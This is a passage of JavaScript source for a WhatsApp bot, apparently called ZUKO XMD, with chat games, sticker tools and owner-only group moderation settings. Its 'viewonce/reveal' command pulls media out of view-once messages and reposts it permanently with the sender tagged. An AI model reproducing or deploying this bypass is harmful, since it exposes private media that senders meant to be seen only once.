  const stages = [
    `
   -----
   |   |
       |
       |
       |
       |
=========
    `,
    `
   -----
   |   |
   O   |
       |
       |
       |
=========
    `,
    `
   -----
   |   |
   O   |
   |   |
       |
       |
=========
    `,
    `
   -----
   |   |
   O   |
  /|   |
       |
       |
=========
    `,
    `
   -----
   |   |
   O   |
  /|\\  |
       |
       |
=========
    `,
    `
   -----
   |   |
   O   |
  /|\\  |
  /    |
       |
=========
    `,
    `
   -----
   |   |
   O   |
  /|\\  |
  / \\  |
       |
=========
    `
  ]
  return stages[6 - attempts] || stages[0]
}

case 'trivia':
case 'quiz': {
  const triviaQuestions = [
    { question: "What is the capital of France?", options: ["London", "Berlin", "Paris", "Madrid"], answer: 2 },
    { question: "Which planet is known as the Red Planet?", options: ["Mars", "Jupiter", "Venus", "Saturn"], answer: 0 },
    { question: "Who painted the Mona Lisa?", options: ["Van Gogh", "Picasso", "Da Vinci", "Rembrandt"], answer: 2 },
    { question: "What is the largest ocean on Earth?", options: ["Atlantic", "Indian", "Arctic", "Pacific"], answer: 3 },
    { question: "Which year did World War II end?", options: ["1943", "1944", "1945", "1946"], answer: 2 },
    { question: "What is the fastest land animal?", options: ["Lion", "Cheetah", "Leopard", "Tiger"], answer: 1 },
    { question: "Who wrote 'Romeo and Juliet'?", options: ["Charles Dickens", "Jane Austen", "William Shakespeare", "Mark Twain"], answer: 2 },
    { question: "What is the chemical symbol for Gold?", options: ["Go", "Gd", "Au", "Ag"], answer: 2 },
    { question: "Which is the longest river in the world?", options: ["Amazon", "Nile", "Yangtze", "Mississippi"], answer: 1 },
    { question: "What is the square root of 144?", options: ["10", "11", "12", "13"], answer: 2 }
  ]
  
  let game = activeGames.trivia[m.chat]
  
  if (text === 'reset') {
    if (activeGames.trivia[m.chat]) {
      delete activeGames.trivia[m.chat]
      reply('✅ Trivia game reset!')
    } else {
      reply('❌ No active trivia game.')
    }
    return
  }
  
  if (!game) {
    const randomQuestion = triviaQuestions[Math.floor(Math.random() * triviaQuestions.length)]
    game = {
      ...randomQuestion,
      active: true,
      startTime: Date.now()
    }
    activeGames.trivia[m.chat] = game
    
    let optionsText = ''
    game.options.forEach((opt, i) => {
      optionsText += `${i + 1}. ${opt}\n`
    })
    
    await empire.sendMessage(m.chat, {
      text: `🎯 *TRIVIA TIME!*\n\n📝 ${game.question}\n\n${optionsText}\n\n⏰ You have 30 seconds!\n💡 Answer with: ${prefix}trivia <1-4>\n🔄 Reset: ${prefix}trivia reset`
    }, { quoted: m })
    
    // Auto-end after 30 seconds
    setTimeout(() => {
      if (activeGames.trivia[m.chat] && activeGames.trivia[m.chat].active) {
        delete activeGames.trivia[m.chat]
        empire.sendMessage(m.chat, { text: '⏰ Time\'s up! No one answered correctly. Start a new trivia with: .trivia' })
      }
    }, 30000)
    return
  }
  
  if (game.active) {
    const answer = parseInt(text) - 1
    if (isNaN(answer) || answer < 0 || answer > 3) {
      return reply(`❌ Invalid answer! Choose 1-4.\n\n${game.question}\n1. ${game.options[0]}\n2. ${game.options[1]}\n3. ${game.options[2]}\n4. ${game.options[3]}`)
    }
    
    if (answer === game.answer) {
      const timeTaken = ((Date.now() - game.startTime) / 1000).toFixed(1)
      await empire.sendMessage(m.chat, {
        text: `🎉 *CORRECT!* 🎉\n\n✅ Answer: ${game.options[game.answer]}\n⏰ Time: ${timeTaken} seconds\n\n🏆 @${m.sender.split('@')[0]} wins!\n\nStart new trivia with: ${prefix}trivia`,
        mentions: [m.sender]
      }, { quoted: m })
      delete activeGames.trivia[m.chat]
    } else {
      await empire.sendMessage(m.chat, {
        text: `❌ *WRONG!*\n\nYour answer: ${game.options[answer]}\nCorrect answer: ${game.options[game.answer]}\n\nBetter luck next time!\n\nStart new trivia with: ${prefix}trivia`,
        mentions: [m.sender]
      }, { quoted: m })
      delete activeGames.trivia[m.chat]
    }
  }
}
break

case 'wordle':
case 'wrdl': {
  const wordList = [
    'BRAIN', 'SMART', 'QUICK', 'FOCUS', 'ALERT',
    'SHARP', 'BRIGHT', 'CLEAR', 'LOGIC', 'SKILL'
  ]
  
  let game = activeGames.wordle[m.chat]
  
  if (text === 'reset') {
    if (activeGames.wordle[m.chat]) {
      delete activeGames.wordle[m.chat]
      reply('✅ Wordle game reset!')
    } else {
      reply('❌ No active Wordle game.')
    }
    return
  }
  
  if (!game) {
    const targetWord = wordList[Math.floor(Math.random() * wordList.length)]
    game = {
      word: targetWord,
      attempts: 0,
      maxAttempts: 6,
      guessed: [],
      active: true
    }
    activeGames.wordle[m.chat] = game
    
    await empire.sendMessage(m.chat, {
      text: `🎯 *WORDLE GAME STARTED!*\n\nGuess the 5-letter word!\nYou have ${game.maxAttempts} attempts.\n\n💡 Usage: ${prefix}wordle <word>\n🔄 Reset: ${prefix}wordle reset`
    }, { quoted: m })
    return
  }
  
  if (game.active && game.attempts < game.maxAttempts) {
    const guess = text.toUpperCase()
    
    if (guess.length !== 5 || !guess.match(/^[A-Z]+$/)) {
      return reply('❌ Please guess a 5-letter word!')
    }
    
    game.attempts++
    
    // Evaluate guess
    let result = ''
    for (let i = 0; i < 5; i++) {
      if (guess[i] === game.word[i]) {
        result += '🟩'
      } else if (game.word.includes(guess[i])) {
        result += '🟨'
      } else {
        result += '⬛'
      }
    }
    
    game.guessed.push({ word: guess, result })
    
    let history = ''
    game.guessed.forEach(g => {
      history += `${g.word} → ${g.result}\n`
    })
    
    if (guess === game.word) {
      await empire.sendMessage(m.chat, {
        text: `🎉 *VICTORY!* 🎉\n\n${history}\n\n🏆 You guessed "${game.word}" in ${game.attempts} attempts!\n\nStart new game with: ${prefix}wordle`,
        mentions: [m.sender]
      }, { quoted: m })
      delete activeGames.wordle[m.chat]
    } 
    else if (game.attempts >= game.maxAttempts) {
      await empire.sendMessage(m.chat, {
        text: `💀 *GAME OVER!*\n\nThe word was: ${game.word}\n\nBetter luck next time!\n\nStart new game with: ${prefix}wordle`
      }, { quoted: m })
      delete activeGames.wordle[m.chat]
    }
    else {
      await empire.sendMessage(m.chat, {
        text: `🎮 *WORDLE - Attempt ${game.attempts}/${game.maxAttempts}*\n\n${history}\n\n💡 Guess another 5-letter word!`
      }, { quoted: m })
    }
  }
}
break

case 'mathgame':
case 'math': {
  let game = activeGames.mathgame[m.chat]
  
  if (text === 'reset') {
    if (activeGames.mathgame[m.chat]) {
      delete activeGames.mathgame[m.chat]
      reply('✅ Math game reset!')
    } else {
      reply('❌ No active math game.')
    }
    return
  }
  
  if (!game) {
    const num1 = Math.floor(Math.random() * 50) + 1
    const num2 = Math.floor(Math.random() * 50) + 1
    const operators = ['+', '-', '*']
    const operator = operators[Math.floor(Math.random() * operators.length)]
    
    let answer
    if (operator === '+') answer = num1 + num2
    else if (operator === '-') answer = num1 - num2
    else answer = num1 * num2
    
    game = {
      num1, num2, operator, answer,
      active: true,
      startTime: Date.now()
    }
    activeGames.mathgame[m.chat] = game
    
    await empire.sendMessage(m.chat, {
      text: `🧮 *MATH CHALLENGE!*\n\n📝 ${num1} ${operator} ${num2} = ?\n\n⏰ You have 20 seconds!\n💡 Answer with: ${prefix}math <number>\n🔄 Reset: ${prefix}math reset`
    }, { quoted: m })
    
    setTimeout(() => {
      if (activeGames.mathgame[m.chat] && activeGames.mathgame[m.chat].active) {
        delete activeGames.mathgame[m.chat]
        empire.sendMessage(m.chat, { text: '⏰ Time\'s up! No correct answer. Start a new math game with: .math' })
      }
    }, 20000)
    return
  }
  
  if (game.active) {
    const userAnswer = parseInt(text)
    if (isNaN(userAnswer)) return reply('❌ Please provide a number!')
    
    const timeTaken = ((Date.now() - game.startTime) / 1000).toFixed(1)
    
    if (userAnswer === game.answer) {
      await empire.sendMessage(m.chat, {
        text: `🎉 *CORRECT!* 🎉\n\n✅ ${game.num1} ${game.operator} ${game.num2} = ${game.answer}\n⏰ Time: ${timeTaken} seconds\n\n🏆 @${m.sender.split('@')[0]} wins!\n\nStart new math game with: ${prefix}math`,
        mentions: [m.sender]
      }, { quoted: m })
      delete activeGames.mathgame[m.chat]
    } else {
      await empire.sendMessage(m.chat, {
        text: `❌ *WRONG!*\n\nYour answer: ${userAnswer}\nCorrect answer: ${game.answer}\n\nBetter luck next time!\n\nStart new math game with: ${prefix}math`,
        mentions: [m.sender]
      }, { quoted: m })
      delete activeGames.mathgame[m.chat]
    }
  }
}
break
case 'rps':
case 'rockpaperscissors': {
  const choices = ['rock', 'paper', 'scissors']
  const emojis = { rock: '🪨', paper: '📄', scissors: '✂️' }
  
  const userChoice = text.toLowerCase()
  if (!choices.includes(userChoice)) {
    return reply(`🎮 *ROCK PAPER SCISSORS*\n\nUsage: ${prefix}rps <rock|paper|scissors>\n\nExample: ${prefix}rps rock`)
  }
  
  const botChoice = choices[Math.floor(Math.random() * choices.length)]
  
  let result
  if (userChoice === botChoice) {
    result = "🤝 IT'S A TIE!"
  } else if (
    (userChoice === 'rock' && botChoice === 'scissors') ||
    (userChoice === 'paper' && botChoice === 'rock') ||
    (userChoice === 'scissors' && botChoice === 'paper')
  ) {
    result = "🎉 YOU WIN!"
  } else {
    result = "💀 YOU LOSE!"
  }
  
  const resultEmoji = result.includes('WIN') ? '🏆' : result.includes('LOSE') ? '😭' : '🤝'
  
  await empire.sendMessage(m.chat, {
    text: `🎮 *ROCK PAPER SCISSORS*\n\n${resultEmoji} *${result}* ${resultEmoji}\n\n👤 You: ${emojis[userChoice]} ${userChoice}\n🤖 Bot: ${emojis[botChoice]} ${botChoice}\n\nPlay again with: ${prefix}rps <choice>`
  }, { quoted: m })
}
break

case 'numberguess':
case 'guessnumber': {
  let game = activeGames.numberguess[m.chat]
  
  if (text === 'reset') {
    if (activeGames.numberguess[m.chat]) {
      delete activeGames.numberguess[m.chat]
      reply('✅ Number guess game reset!')
    } else {
      reply('❌ No active game.')
    }
    return
  }
  
  if (!game) {
    const target = Math.floor(Math.random() * 100) + 1
    game = {
      target: target,
      attempts: 0,
      maxAttempts: 10,
      active: true,
      range: { min: 1, max: 100 }
    }
    activeGames.numberguess[m.chat] = game
    
    await empire.sendMessage(m.chat, {
      text: `🔢 *GUESS THE NUMBER!*\n\nI'm thinking of a number between 1 and 100.\nYou have ${game.maxAttempts} attempts!\n\n💡 Usage: ${prefix}guessnumber <number>\n🔄 Reset: ${prefix}guessnumber reset`
    }, { quoted: m })
    return
  }
  
  if (game.active && game.attempts < game.maxAttempts) {
    const guess = parseInt(text)
    if (isNaN(guess) || guess < 1 || guess > 100) {
      return reply('❌ Please guess a number between 1 and 100!')
    }
    
    game.attempts++
    
    if (guess === game.target) {
      await empire.sendMessage(m.chat, {
        text: `🎉 *CORRECT!* 🎉\n\nThe number was ${game.target}!\nYou guessed it in ${game.attempts} attempts!\n\n🏆 @${m.sender.split('@')[0]} wins!\n\nStart new game with: ${prefix}guessnumber`,
        mentions: [m.sender]
      }, { quoted: m })
      delete activeGames.numberguess[m.chat]
    }
    else if (game.attempts >= game.maxAttempts) {
      await empire.sendMessage(m.chat, {
        text: `💀 *GAME OVER!*\n\nThe number was ${game.target}.\n\nBetter luck next time!\n\nStart new game with: ${prefix}guessnumber`
      }, { quoted: m })
      delete activeGames.numberguess[m.chat]
    }
    else {
      const hint = guess < game.target ? '📈 HIGHER!' : '📉 LOWER!'
      const remaining = game.maxAttempts - game.attempts
      
      await empire.sendMessage(m.chat, {
        text: `❌ ${guess} is ${hint}\n\nAttempts: ${game.attempts}/${game.maxAttempts}\nRemaining: ${remaining}\n\nKeep guessing!`
      }, { quoted: m })
    }
  }
}
break

case 'dice':
case 'rolldice': {
  const dice1 = Math.floor(Math.random() * 6) + 1
  const dice2 = Math.floor(Math.random() * 6) + 1
  const total = dice1 + dice2
  
  const diceEmojis = {
    1: '⚀', 2: '⚁', 3: '⚂', 4: '⚃', 5: '⚄', 6: '⚅'
  }
  
  let message = `🎲 *DICE ROLL* 🎲\n\n┌─────────┐\n│  ${diceEmojis[dice1]}    ${diceEmojis[dice2]}  │\n└─────────┘\n\n📊 Results: ${dice1} + ${dice2} = ${total}\n`
  
  if (total === 2) message += '\n💀 *SNAKE EYES!* 💀'
  else if (total === 7) message += '\n🍀 *LUCKY 7!* 🍀'
  else if (total === 12) message += '\n🎉 *BOX CARS!* 🎉'
  else if (total % 2 === 0) message += '\n✨ Even number roll! ✨'
  else message += '\n🎲 Odd number roll! 🎲'
  
  await empire.sendMessage(m.chat, {
    text: message,
    mentions: [m.sender]
  }, { quoted: m })
}
break

case 'coinflip':
case 'flipcoin': {
  const result = Math.random() < 0.5 ? 'HEADS' : 'TAILS'
  const emoji = result === 'HEADS' ? '🪙👑' : '🪙💫'
  
  let message = `${emoji} *COIN FLIP* ${emoji}\n\n┌─────────┐\n│         │\n│    ${result === 'HEADS' ? '👑' : '💫'}    │\n│         │\n└─────────┘\n\n📊 Result: *${result}*`
  
  if (result === 'HEADS') message += '\n\n👑 You got heads!'
  else message += '\n\n💫 You got tails!'
  
  await empire.sendMessage(m.chat, {
    text: message,
    mentions: [m.sender]
  }, { quoted: m })
}
break

case 'slotmachine':
case 'slots': {
  const symbols = ['🍒', '🍋', '🍊', '🍉', '⭐', '💎', '7️⃣', '🎰']
  const reels = [
    symbols[Math.floor(Math.random() * symbols.length)],
    symbols[Math.floor(Math.random() * symbols.length)],
    symbols[Math.floor(Math.random() * symbols.length)]
  ]
  
  let result = ''
  let winnings = 0
  
  if (reels[0] === reels[1] && reels[1] === reels[2]) {
    result = '🎉 *JACKPOT!* 🎉'
    winnings = 1000
  } else if (reels[0] === reels[1] || reels[1] === reels[2] || reels[0] === reels[2]) {
    result = '✨ *SMALL WIN!* ✨'
    winnings = 100
  } else {
    result = '💀 *NO WIN!* 💀'
    winnings = 0
  }
  
  await empire.sendMessage(m.chat, {
    text: `🎰 *SLOT MACHINE* 🎰\n\n┌─────┬─────┬─────┐\n│  ${reels[0]}  │  ${reels[1]}  │  ${reels[2]}  │\n└─────┴─────┴─────┘\n\n${result}\n💰 Winnings: ${winnings} coins\n\nPlay again with: ${prefix}slots`
  }, { quoted: m })
}
break

case 'battleship':
case 'bship': {
  if (!m.isGroup) return reply('❌ Play in groups only!')
  
  const opponent = m.mentionedJid[0]
  if (!opponent) return reply(`⚓ *BATTLESHIP*\n\nUsage: ${prefix}bship start @opponent\n\nChallenge someone to Battleship!`)
  
  if (opponent === m.sender) return reply('❌ You cannot play against yourself!')
  
  const gameId = m.chat
  if (activeGames.battleship[gameId]) return reply('⚠️ A game is already in progress!')
  
  // Initialize boards
  const createBoard = () => {
    const board = Array(10).fill().map(() => Array(10).fill('🌊'))
    // Place random ships (simplified)
    return board
  }
  
  activeGames.battleship[gameId] = {
    player1: m.sender,
    player2: opponent,
    board1: createBoard(),
    board2: createBoard(),
    turn: m.sender,
    active: true
  }
  
  await empire.sendMessage(m.chat, {
    text: `⚓ *BATTLESHIP STARTED!*\n\n👑 Player 1: @${m.sender.split('@')[0]}\n👤 Player 2: @${opponent.split('@')[0]}\n\n🎮 Game begins!\n\nUse: ${prefix}bship fire <A1-J10>`,
    mentions: [m.sender, opponent]
  }, { quoted: m })
}
break

case 'connect4':
case 'c4': {
  if (!m.isGroup) return reply('❌ Play in groups only!')
  
  const opponent = m.mentionedJid[0]
  if (!opponent) return reply(`🔴 *CONNECT 4*\n\nUsage: ${prefix}c4 start @opponent\n\nChallenge someone to Connect 4!`)
  
  if (opponent === m.sender) return reply('❌ You cannot play against yourself!')
  
  const gameId = m.chat
  if (activeGames.connect4[gameId]) return reply('⚠️ A game is already in progress!')
  
  // Initialize board (6 rows x 7 columns)
  const board = Array(6).fill().map(() => Array(7).fill('⚪'))
  
  activeGames.connect4[gameId] = {
    player1: m.sender,
    player2: opponent,
    board: board,
    turn: m.sender,
    active: true,
    moves: 0
  }
  
  const boardDisplay = displayConnect4(board)
  
  await empire.sendMessage(m.chat, {
    text: `🔴 *CONNECT 4 STARTED!* 🔵\n\n${boardDisplay}\n\n👑 Turn: @${m.sender.split('@')[0]} (🔴)\n👤 Opponent: @${opponent.split('@')[0]} (🔵)\n\nUse: ${prefix}c4 drop <1-7>`,
    mentions: [m.sender, opponent]
  }, { quoted: m })
}
break

function displayConnect4(board) {
  let display = ''
  for (let row of board) {
    display += row.join(' ') + '\n'
  }
  display += '1 2 3 4 5 6 7'
  return display
}

case 'games':
case 'gamelist': {
  await empire.sendMessage(m.chat, {
    text: `🎮 *ZUKO GAMES MENU* 🎮

╭━━━━━━━━━━━━━━━━━━━━━╮
┃ 🎮 TicTacToe - .ttt
┃ 🔤 Hangman - .hm
┃ ❓ Trivia - .trivia
┃ 📝 Wordle - .wordle
┃ 🧮 Math Game - .math
┃ 🪨 RPS - .rps
┃ 🔢 Guess Number - .guessnumber
┃ 🎲 Dice Roll - .dice
┃ 🪙 Coin Flip - .coinflip
┃ 🎰 Slots - .slots
┃ ⚓ Battleship - .bship
┃ 🔴 Connect4 - .c4
╰━━━━━━━━━━━━━━━━━━━━━╯

💡 Use .help <game> for detailed instructions!`
  }, { quoted: m })
}
break
case 'blocklist':
case 'blockedlist': {
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const blocked = await empire.fetchBlocklist()
    
    if (!blocked || blocked.length === 0) {
      return reply('📭 No blocked users.')
    }
    
    let list = '🚫 *BLOCKED USERS*\n\n'
    const mentions = []
    
    blocked.forEach((jid, i) => {
      list += `${i + 1}. @${jid.split('@')[0]}\n`
      mentions.push(jid)
    })
    
    await empire.sendMessage(m.chat, {
      text: list,
      mentions: mentions
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to fetch blocklist.')
  }
}
break
// ==================== VIEWONCE REVEAL COMMANDS ====================

case 'toviewonce':
case 'reveal':
case 'viewonce': {
  if (!m.quoted) return reply('📸 Reply to a view-once message (image, video, or voice note)')
  
  try {
    const quoted = m.quoted
    const msg = quoted.message
    
    // Check if it's a view-once message
    const isViewOnce = msg.viewOnceMessage || 
                      msg.viewOnceMessageV2 || 
                      msg.viewOnceMessageV2Extension ||
                      quoted.mtype === 'viewOnceMessage' ||
                      quoted.mtype === 'viewOnceMessageV2'
    
    if (!isViewOnce) return reply('❌ This is not a view-once message! Reply to a 🔒 view-once message.')
    
    // Extract the actual message from view-once wrapper
    let actualMsg = msg
    if (msg.viewOnceMessage) actualMsg = msg.viewOnceMessage.message
    if (msg.viewOnceMessageV2) actualMsg = msg.viewOnceMessageV2.message
    if (msg.viewOnceMessageV2Extension) actualMsg = msg.viewOnceMessageV2Extension.message
    
    // Download media
    let mediaBuffer
    let mediaType
    
    if (actualMsg.imageMessage) {
      mediaBuffer = await downloadMediaMessage(actualMsg.imageMessage, 'image')
      mediaType = 'image'
    } else if (actualMsg.videoMessage) {
      mediaBuffer = await downloadMediaMessage(actualMsg.videoMessage, 'video')
      mediaType = 'video'
    } else if (actualMsg.audioMessage) {
      mediaBuffer = await downloadMediaMessage(actualMsg.audioMessage, 'audio')
      mediaType = 'audio'
    } else {
      return reply('❌ Unsupported view-once media type')
    }
    
    if (!mediaBuffer) return reply('❌ Failed to download view-once content')
    
    // Send revealed content
    const caption = `🔓 *VIEW-ONCE REVEALED*\n👤 From: @${m.quoted.sender?.split('@')[0] || 'Unknown'}\n📅 ${new Date().toLocaleString()}`
    
    if (mediaType === 'image') {
      await empire.sendMessage(m.chat, {
        image: mediaBuffer,
        caption: caption,
        mentions: [m.quoted.sender]
      }, { quoted: m })
    } else if (mediaType === 'video') {
      await empire.sendMessage(m.chat, {
        video: mediaBuffer,
        caption: caption,
        mentions: [m.quoted.sender]
      }, { quoted: m })
    } else if (mediaType === 'audio') {
      await empire.sendMessage(m.chat, {
        audio: mediaBuffer,
        mimetype: 'audio/mpeg',
        ptt: true,
        caption: caption
      }, { quoted: m })
    }
    
    await empire.sendMessage(m.chat, { react: { text: '🔓', key: m.key } })
    
  } catch (err) {
    console.error('ViewOnce Error:', err)
    reply('❌ Failed to reveal view-once message. Make sure you replied to a valid view-once message.')
  }
}
break

// Helper function to download media
async function downloadMediaMessage(msg, type) {
  try {
    const stream = await downloadContentFromMessage(msg, type)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }
    return buffer
  } catch (err) {
    console.error('Download error:', err)
    return null
  }
}

// ==================== STICKER COMMANDS ====================

case 'toimg':
case 'toimage': {
  if (!m.quoted) return reply('🎴 Reply to a sticker to convert to image')
  
  const mime = m.quoted.mimetype || ''
  if (!/webp/.test(mime)) return reply('❌ Reply to a sticker (.webp file)')
  
  try {
    const media = await m.quoted.download()
    if (!media) return reply('❌ Failed to download sticker')
    
    // Convert webp to PNG/JPG
    const { convertWebpToImage } = require('./allfunc/storage')
    const imageBuffer = await convertWebpToImage(media)
    
    await empire.sendMessage(m.chat, {
      image: imageBuffer,
      caption: `🖼️ *STICKER CONVERTED TO IMAGE*\n\nConverted by ZUKO XMD`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
  } catch (err) {
    console.error('ToImage Error:', err)
    reply('❌ Failed to convert sticker to image')
  }
}
break

case 'tosticker':
case 'sticker': {
  const quoted = m.quoted || m
  const mime = quoted.mimetype || ''
  
  if (!/image|video/.test(mime)) {
    return reply(`🎨 *STICKER MAKER*\n\nUsage:\n1. Reply to an image: ${prefix}sticker\n2. Reply to a video (max 10s): ${prefix}sticker\n3. Add packname: ${prefix}sticker <packname> | <author>`)
  }
  
  try {
    // Get packname and author
    let packname = global.packname || 'ZUKO XMD'
    let author = global.author || 'Sticker Bot'
    
    if (text && text.includes('|')) {
      const parts = text.split('|')
      packname = parts[0].trim() || packname
      author = parts[1].trim() || author
    } else if (text) {
      packname = text
    }
    
    const media = await quoted.download()
    if (!media) return reply('❌ Failed to download media')
    
    let stickerBuffer
    
    if (/video/.test(mime)) {
      // Convert video to sticker (GIF-like)
      const { videoToWebp } = require('./allfunc/exif')
      stickerBuffer = await videoToWebp(media)
    } else {
      // Convert image to sticker
      const { imageToWebp } = require('./allfunc/exif')
      stickerBuffer = await imageToWebp(media)
    }
    
    // Add EXIF metadata
    const { addExif } = require('./allfunc/exif')
    const finalSticker = await addExif(stickerBuffer, packname, author)
    
    await empire.sendMessage(m.chat, {
      sticker: finalSticker
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
    
  } catch (err) {
    console.error('Sticker Error:', err)
    reply('❌ Failed to create sticker. Make sure the media is valid.')
  }
}
break

case 'take':
case 'steal':
case 'getsticker': {
  if (!m.quoted) return reply('🎴 Reply to a sticker to copy/steal it')
  
  const mime = m.quoted.mimetype || ''
  if (!/webp/.test(mime)) return reply('❌ Reply to a sticker')
  
  try {
    let packname = global.packname || 'ZUKO XMD'
    let author = global.author || 'Sticker Bot'
    
    if (text && text.includes('|')) {
      const parts = text.split('|')
      packname = parts[0].trim() || packname
      author = parts[1].trim() || author
    } else if (text) {
      packname = text
    }
    
    const media = await m.quoted.download()
    if (!media) return reply('❌ Failed to download sticker')
    
    const { addExif } = require('./allfunc/exif')
    const stickerWithExif = await addExif(media, packname, author)
    
    await empire.sendMessage(m.chat, {
      sticker: stickerWithExif
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    reply(`✅ Sticker stolen!\n📦 Pack: ${packname}\n✍️ Author: ${author}`)
    
  } catch (err) {
    console.error('Steal Sticker Error:', err)
    reply('❌ Failed to steal sticker')
  }
}
break

case 'toanime':
case 'animeify': {
  if (!m.quoted) return reply('🎴 Reply to an image to anime-fy it')
  
  const mime = m.quoted.mimetype || ''
  if (!/image/.test(mime)) return reply('❌ Reply to an image')
  
  await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
  
  try {
    const media = await m.quoted.download()
    if (!media) return reply('❌ Failed to download image')
    
    // Upload to temporary hosting
    const formData = new FormData()
    formData.append('image', media, 'image.jpg')
    
    const uploadRes = await axios.post('https://tmp.ninja/api.php?d=upload&output=json', formData, {
      headers: { 'Content-Type': 'multipart/form-data' }
    })
    
    const imageUrl = uploadRes.data.files[0].url
    
    // Convert to anime style
    const animeRes = await axios.get(`https://api.animeify.com/convert?url=${encodeURIComponent(imageUrl)}`, {
      responseType: 'arraybuffer'
    })
    
    await empire.sendMessage(m.chat, {
      image: Buffer.from(animeRes.data),
      caption: `🎨 *ANIME-STYLE IMAGE*\n\nConverted by ZUKO XMD`
    }, { quoted: m })
    
  } catch (err) {
    console.error('Animeify Error:', err)
    reply('❌ Failed to convert image to anime style')
  }
}
break

// ==================== ANTI-STICKER COMMANDS ====================

case 'antisticker':
case 'blocksticker': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🚫 *ANTI-STICKER*\n\nUsage: ${prefix}antisticker on/off\n\nWhen enabled, stickers will be automatically deleted in this group.`)
  }
  
  setSetting(m.chat, 'antisticker', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-sticker protection. ${mode === 'on' ? 'Stickers will be deleted.' : 'Stickers are allowed.'}`)
}
break

case 'antistickerall':
case 'globalantisticker': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🌍 *GLOBAL ANTI-STICKER*\n\nUsage: ${prefix}antistickerall on/off\n\nWhen enabled, stickers will be blocked in ALL groups.`)
  }
  
  setSetting('global', 'antisticker', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} global anti-sticker protection.`)
}
break

case 'antistickerpm':
case 'pmstickerblock': {
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📱 *ANTI-STICKER PRIVATE*\n\nUsage: ${prefix}antistickerpm on/off\n\nWhen enabled, stickers will be blocked in private chats.`)
  }
  
  setSetting('global', 'antistickerPM', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-sticker in private chats.`)
}
break

// ==================== ANTI-GROUP MENTION COMMANDS ====================

case 'antigroupmention':
case 'antitagall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🚫 *ANTI-GROUP MENTION*\n\nUsage: ${prefix}antigroupmention on/off\n\nWhen enabled, mass mentions (@everyone style) will be deleted.\nThreshold: ${getSetting(m.chat, 'antitagallThreshold', 10)} mentions`)
  }
  
  setSetting(m.chat, 'antitagall', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-group mention protection.`)
}
break

case 'antitagallthreshold':
case 'tagthreshold': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const threshold = parseInt(args[0])
  
  if (!threshold || threshold < 2 || threshold > 50) {
    return reply(`🎯 *TAG THRESHOLD*\n\nUsage: ${prefix}tagthreshold <2-50>\n\nDefault: 10 mentions\nCurrent: ${getSetting(m.chat, 'antitagallThreshold', 10)}`)
  }
  
  setSetting(m.chat, 'antitagallThreshold', threshold)
  reply(`✅ Anti-group mention threshold set to ${threshold} mentions.`)
}
break

case 'antigrouplink':
case 'blockgrouplink': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🔗 *BLOCK GROUP LINKS*\n\nUsage: ${prefix}antigrouplink on/off\n\nWhen enabled, WhatsApp group invite links will be blocked.`)
  }
  
  setSetting(m.chat, 'antigrouplink', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} group link blocking.`)
}
break

// ==================== ANTI-DEMOTE COMMANDS ====================

case 'antidemote':
case 'demoteprotect': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🛡️ *ANTI-DEMOTE*\n\nUsage: ${prefix}antidemote on/off\n\nWhen enabled, only the group owner can demote admins.\nBot will automatically re-promote demoted admins.`)
  }
  
  setSetting(m.chat, 'antidemote', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-demote protection.`)
}
break

case 'antidemoteexcept':
case 'demoteexempt': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const user = m.mentionedJid[0]
  
  if (!db.demoteExempt) db.demoteExempt = {}
  if (!db.demoteExempt[m.chat]) db.demoteExempt[m.chat] = []
  
  if (action === 'add' && user) {
    if (!db.demoteExempt[m.chat].includes(user)) {
      db.demoteExempt[m.chat].push(user)
      saveDB()
      reply(`✅ @${user.split('@')[0]} added to anti-demote exempt list.`, { mentions: [user] })
    } else {
      reply(`⚠️ @${user.split('@')[0]} is already exempt.`, { mentions: [user] })
    }
  }
  else if (action === 'remove' && user) {
    db.demoteExempt[m.chat] = db.demoteExempt[m.chat].filter(u => u !== user)
    saveDB()
    reply(`✅ @${user.split('@')[0]} removed from exempt list.`, { mentions: [user] })
  }
  else if (action === 'list') {
    const exempt = db.demoteExempt[m.chat]
    if (!exempt.length) return reply('📭 No exempt users.')
    
    let list = '🛡️ *ANTI-DEMOTE EXEMPT USERS*\n\n'
    const mentions = []
    exempt.forEach((u, i) => {
